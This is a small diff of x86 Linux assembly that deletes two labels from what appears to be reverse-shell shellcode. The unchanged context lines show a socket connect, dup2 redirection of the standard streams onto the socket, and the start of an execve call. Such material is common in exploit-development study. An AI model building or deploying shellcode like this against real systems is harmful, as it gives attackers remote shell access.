@@ -59,7 +59,6 @@ _start:
     mov ecx, esp     ; Second parameter for socketcall, points to arguments required by connect()
     int 0x80         ; Tell the kernel let's go!
 
-redirect:
     ; --------------------
     ; # Setup dup2
     ; redirect to stdin
@@ -78,7 +77,6 @@ redirect:
     mov cl, 0x2      ; STDERR
     int 0x80
 
-shell:
     ; --------------------
     ; # Setup execv
     xor edx, edx
